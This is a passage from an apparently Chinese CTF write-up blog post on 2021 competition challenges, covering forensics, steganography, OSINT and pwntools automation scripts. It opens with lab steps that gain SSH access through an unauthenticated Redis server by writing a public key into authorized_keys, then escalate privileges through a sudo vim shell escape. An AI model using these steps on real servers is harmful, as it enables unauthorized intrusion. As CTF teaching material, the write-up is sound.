class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看看80端口的web服务，没有发现什么值得一提的漏洞什么的，只是一个简单的html的界面，那就直接看后面的6379端口的Redis服务。</p><p><strong>Redis无密码 未授权访问</strong></p><p>先使用<code>Redis-cli.exe</code>做一下Redis的登录。</p><pre class="line-numbers language-none"><code class="language-none">redis-cli.exe -h 192.168.10.144 -p 6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后用<code>info server</code>测试一下连接，成功登录。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911123056602.png" alt></p><p>然后深层利用，使用ssh登录密钥进行免密码登录主机，这里要先使用<code>ssh-keygen -t rsa</code>来生成一个密钥，这里我已经生成过了。然后复制出来我的id_rsa.pub公钥文件。</p><pre class="line-numbers language-none"><code class="language-none">config get *<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到redis的目录为<code>/var/lib/redis</code></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911130455509.png" alt></p><pre class="line-numbers language-none"><code class="language-none">192.168.10.144:6379&gt; config set dir &#x2F;var&#x2F;lib&#x2F;redis&#x2F;.sshOK192.168.10.144:6379&gt; config set dbfilename authorized_keysOK192.168.10.144:6379&gt; saveOK<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再在redis-cli上执行下面的内容，其中<code>ssh-rsa key_pub</code>内容就是上面keygen生成的pub公钥文件的内容</p><pre class="line-numbers language-none"><code class="language-none">set xxxx &quot;\n\n\nssh-rsa key_pub\n\n\n&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后再save一下就行了。在攻击机(也就是刚才生成密钥的机器上面)执行下面的命令以连接到受害者主机，密码就是生成key时所用的密码，我这里没设置密码就直接登进去了。</p><pre class="line-numbers language-none"><code class="language-none">ssh -i id_rsa redis@192.168.10.144<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后发现hype用户，使用<code>sudo -u hype /usr/bin/vim /home/hype/backup.sh</code>进入hype用户权限，再输入<code>:!/bin/ash</code></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911133705682.png" alt></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911134024212.png" alt></p><p>下面的mission环节对我来说就没那么有意思了，这里就不再复现了。</p><h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Hiding-in-plain-sight"><a href="#Hiding-in-plain-sight" class="headerlink" title="Hiding in plain sight"></a>Hiding in plain sight</h3><pre class="line-numbers language-none"><code class="language-none">I think there is something fishy about this image.Can you help me out?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>winhex打开，flag在最后。</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810230649250.png" alt></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;h1dd3n_t3xt_1n_pl41ns1ght&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Welcome-to-the-challenge"><a href="#Welcome-to-the-challenge" class="headerlink" title="Welcome to the challenge"></a>Welcome to the challenge</h3><pre class="line-numbers language-none"><code class="language-none">Welcome to the RCTS Challenge!Can you find the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>010editor打开发现最后一点有张png，直接foremost分开就行了</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810231639536.png" alt></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;0n3_1m4g3_1s_n0t_3n0ugh&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="About-us"><a href="#About-us" class="headerlink" title="About us"></a>About us</h3><pre class="line-numbers language-none"><code class="language-none">This challenge is about the RCTS CERT at FCCN.Can you get the flag?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">$ strings RCTSCERT-FCCN.pdf | grep flag  &lt;pdfx:Flag&gt;flag&#123;4b0ut_us_4t_rcts_c3rt&#125;&lt;&#x2F;pdfx:Flag&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;4b0ut_us_4t_rcts_c3rt&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="Keyp-it-universal"><a href="#Keyp-it-universal" class="headerlink" title="Keyp it universal"></a>Keyp it universal</h3><pre class="line-numbers language-none"><code class="language-none">#forensics #pcapWe intercepted a strange communication which we believe has important information inside.Can you retrieve the information from it?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>pacp流量分析、usb流量分析，但是tshark失效了，看起来流量包也没有多长，就直接口算了</p><pre class="line-numbers language-none"><code class="language-none">09 0f 04 0a 202f 18 16 05 202d 13 21 06 0e 20 17 202d 06 21 13 17 18 15 20 202d 1e 16 202d 09 18 11 2030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后又有usb流量对应的字典，直接搞个脚本</p><pre class="line-numbers language-none"><code class="language-none">normalKeys &#x3D; &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;&#x3D;&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;&#x2F;&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;shiftKeys &#x3D; &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;flag &#x3D; &#39;&#39;a &#x3D; &#39;09 0f 04 0a 202f 18 16 05 202d 13 21 06 0e 20 17 202d 06 21 13 17 18 15 20 202d 1e 16 202d 09 18 11 2030&#39;.split()for i in a:    if len(i) &#x3D;&#x3D; 2:        flag +&#x3D; normalKeys[i]    else:        flag +&#x3D; shiftKeys[i[2:]]print(flag)# flag&#123;usb_p4ck3t_c4ptur3_1s_fun&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Maybe-the-helper-can-help"><a href="#Maybe-the-helper-can-help" class="headerlink" title="Maybe the helper can help"></a>Maybe the helper can help</h3><p><strong>steghide爆破</strong></p><p><a href="https://github.com/RickdeJager/stegseek">GitHub地址</a></p><p>使用stegseek爆破直接得</p><pre class="line-numbers language-none"><code class="language-none">└─$ stegseek the-jetsons-family.jpgStegSeek 0.6 - https:&#x2F;&#x2F;github.com&#x2F;RickdeJager&#x2F;StegSeek[i] Found passphrase: &quot;rosey&quot;[i] Original filename: &quot;steganopayload986089.txt&quot;.[i] Extracting to &quot;the-jetsons-family.jpg.out&quot;.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210911233138888.png" alt></p><p>两次base64解密之后得到flag</p><pre class="line-numbers language-none"><code class="language-none">flag&#123;ThEfUtUrEiSnOw!&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>stegseek是steghide隐写的爆破工具，使用的是专门的密码库，反正一般的密码解起来还是挺快的。</p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Welcome-to-Lisbon"><a href="#Welcome-to-Lisbon" class="headerlink" title="Welcome to Lisbon!"></a>Welcome to Lisbon!</h3><pre class="line-numbers language-none"><code class="language-none">Oh, some activists defaced a Victoria Secret&#39;s store.Find out which was the model whose photo was damaged.Flag format: flag&#123;firstname_surname&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>社工题</p><p>直接上谷歌搜<code>Victoria Secret&#39;s store lisbon</code>，跳出来的第一个就是这个商店，然后进入详情找到比较清晰的一张</p><p><a href="https://foursquare.com/v/victorias-secret/51f6abee498ecfea45748da0/photos">Victoria Secret’s store</a></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810235703483.png" alt></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210810235510323.png" alt></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210811001253648.png" alt></p><p><del>但是这国外的模特咱也不认识啊，这题就搁置了。</del></p><p>oh，原来她叫<code>Adriana lima</code></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;adriana_lima&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h2><h3 id="Knock-Knock"><a href="#Knock-Knock" class="headerlink" title="Knock Knock"></a>Knock Knock</h3><pre class="line-numbers language-none"><code class="language-none">&#96;&#96;&#96;# InCTF## misc### Sanity Check签到<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>inctf{welcome_t0_inctf_internationals_2021}<br><pre class="line-numbers language-none"><code class="language-none">### Alpha Pie<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>We have created a mini game to test your skills. Go grab the flag!!<br><pre class="line-numbers language-none"><code class="language-none">&#96;nc misc.challenge.bi0s.in 1337&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>Welcome to Alpha pie game!!!<br>Rules:</p><ol><li>To complete one level you have match the left matrix to the right one by moiving each letter to their position in the right matrix</li><li>Moving to only adjecent column or row is possible.</li><li>Diagonal movements are not possible</li><li>negative numbers are not allowed in the input</li><li>The input format should be ‘current-x-cord,current-y-cord,to-x-cord,to-y-cord’.<br>eg : 0,0,0,1 (Will move letter at position 0,0 to position 0,1 if a letters is present at 0,0 and no letter is present at 0,1).</li><li>Number of moves will be limited for each level.</li><li>The game has a time limit of ‘n’ minutes.</li><li>You will lose the game if you enter certain number of invalid moves</li><li>After you pass 9 levels you will ge the flag.<br>Good luck ! Enjoy the game 👍</li></ol><p>Press ‘y’ to start:<br><pre class="line-numbers language-none"><code class="language-none">简单写个脚本，一会儿就出来了，成功率还是很高的，这种不成功再执行一次，一次一次总会成功的。![](2021年各比赛wp&#x2F;image-20210814022515512.png)&#96;&#96;&#96;pythonfrom pwn import *chall &#x3D; remote(&#39;misc.challenge.bi0s.in&#39;, 1337)chall.sendlineafter(b&quot;Press &#39;y&#39; to start:&quot;, b&#39;y&#39;)def GetLevel():    lev &#x3D; 1    while True:        data &#x3D; chall.recvline()        if b&#39;Level-&#39; in data:            lev &#x3D; data[7]            print(data)            print(chr(lev))            try:                lev &#x3D; int(chr(lev))            except:                lev &#x3D; int(chr(data[6]))            print(&#39;Level &#x3D;&#39;, lev)        if b&#39;-------&#39; in data:            return levdef step1(level):    base, target &#x3D; [&quot;&quot;], [&quot;&quot;]    for i in range(level):        base.append(&quot;&quot;)        target.append(&quot;&quot;)    x &#x3D; 0    while True:        payload &#x3D; &quot;&quot;        data &#x3D; chall.recvline()        if b&#39;|&#39; in data:            print(data)            for y in range(level + 1):                base[x] +&#x3D; chr(data[y * 4 + 2])            tmp &#x3D; level * 5 + 8            for y in range(level + 1):                target[x] +&#x3D; chr(data[tmp + 4 * y])            x +&#x3D; 1        else:            if base[0] &#x3D;&#x3D; &#39;&#39;:                continue            temp &#x3D; &#39;&#39;            for i in range(len(base)):                tmp &#x3D; base[i]                for j in range(len(tmp)):                    if tmp[j] !&#x3D; &#39;0&#39; and target[i][j] !&#x3D; tmp[j]:                        payload &#x3D; str(i) + &#39;,&#39; + str(j) + &#39;,&#39;                        temp &#x3D; tmp[j]            for a in range(len(target)):                tmp &#x3D; target[a]                for b in range(len(tmp)):                    if tmp[b] &#x3D;&#x3D; temp:                        payload +&#x3D; str(a) + &#39;,&#39; + str(b)            if payload[0] !&#x3D; payload[4] and base[int(payload[4])][int(payload[2])] &#x3D;&#x3D; &#39;0&#39;:                payload &#x3D; payload[:-1] + payload[2]            elif payload[0] !&#x3D; payload[4] and base[int(payload[0])][int(payload[6])] &#x3D;&#x3D; &#39;0&#39;:                payload &#x3D; payload[:4] + payload[0] + payload[5:]            if base[int(payload[4])][int(payload[6])] !&#x3D; &#39;0&#39; or (base[int(payload[4])][int(payload[2])] !&#x3D; &#39;0&#39; and base[int(payload[0])][int(payload[6])] !&#x3D; &#39;0&#39;) or payload[:3] &#x3D;&#x3D; payload[4:]:                payload &#x3D; payload[4:] + &#39;,&#39; + payload[4] + &#39;,&#39; + payload[base[int(payload[4])].index(&#39;0&#39;)]            break    data &#x3D; chall.recvline()    print(payload)    chall.sendlineafter(b&quot;to-y-cord &#39; :&quot;, payload.encode())if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    while True:        data &#x3D; chall.recvline()        if b&#39;-------&#39; in data:            break    for Level in range(9):        while True:            step1(Level + 1)            data &#x3D; chall.recvline()            if b&quot;Congrats&quot; in data:                break    while True:        data &#x3D; chall.recvline()        print(data)        if b&#39;ctf&#39; in data:            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="find-plut0"><a href="#find-plut0" class="headerlink" title="find_plut0"></a>find_plut0</h3><pre class="line-numbers language-none"><code class="language-none">Find pluto , and get your Reward !!<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="吃瓜杯"><a href="#吃瓜杯" class="headerlink" title="吃瓜杯"></a>吃瓜杯</h1><h2 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h2><p>CTFSHOW举办的一次比赛，题目比较多。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Misc游戏签到"><a href="#Misc游戏签到" class="headerlink" title="Misc游戏签到"></a>Misc游戏签到</h3><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815024335170.png" alt></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815024149115.png" alt="image-20210815024149115"></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815025427006.png" alt="image-20210815025427006"></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210815021239362.png" alt></p><pre class="line-numbers language-none"><code class="language-none">ctfshow&#123;White_give_game_only_waste_your_timehahaha&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> time<span class="token keyword">import</span> random<span class="token keyword">def</span> <span class="token function">GetMes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ans <span class="token operator">=</span> <span class="token string">''</span>    ret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    tmp1 <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'&#125;'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> tmp1 <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                ret<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            tmp1 <span class="token operator">+=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tmp1 <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">if</span> tmp1 <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>            ans <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token builtin">min</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>            ans <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token builtin">max</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>ret<span class="token punctuation">)</span>            <span class="token keyword">return</span> ans<span class="token keyword">def</span> <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ch <span class="token operator">=</span> <span class="token string">''</span>    order <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            order <span class="token operator">=</span> GetMes<span class="token punctuation">(</span><span class="token punctuation">)</span>            chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'------------------------------\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            GetMes<span class="token punctuation">(</span><span class="token punctuation">)</span>            chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'------------------------------\n'</span><span class="token punctuation">,</span> order<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'flag'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            ch <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'2'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">return</span> ch<span class="token keyword">def</span> <span class="token function">step2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ch <span class="token operator">=</span> step1<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> ch <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">,</span> ch<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        data <span class="token operator">=</span> chall<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">b'&#125;'</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">10000000</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        chall <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn.challenge.ctf.show'</span><span class="token punctuation">,</span> <span class="token number">28148</span><span class="token punctuation">)</span>        chall<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'0.Magic option\n'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span 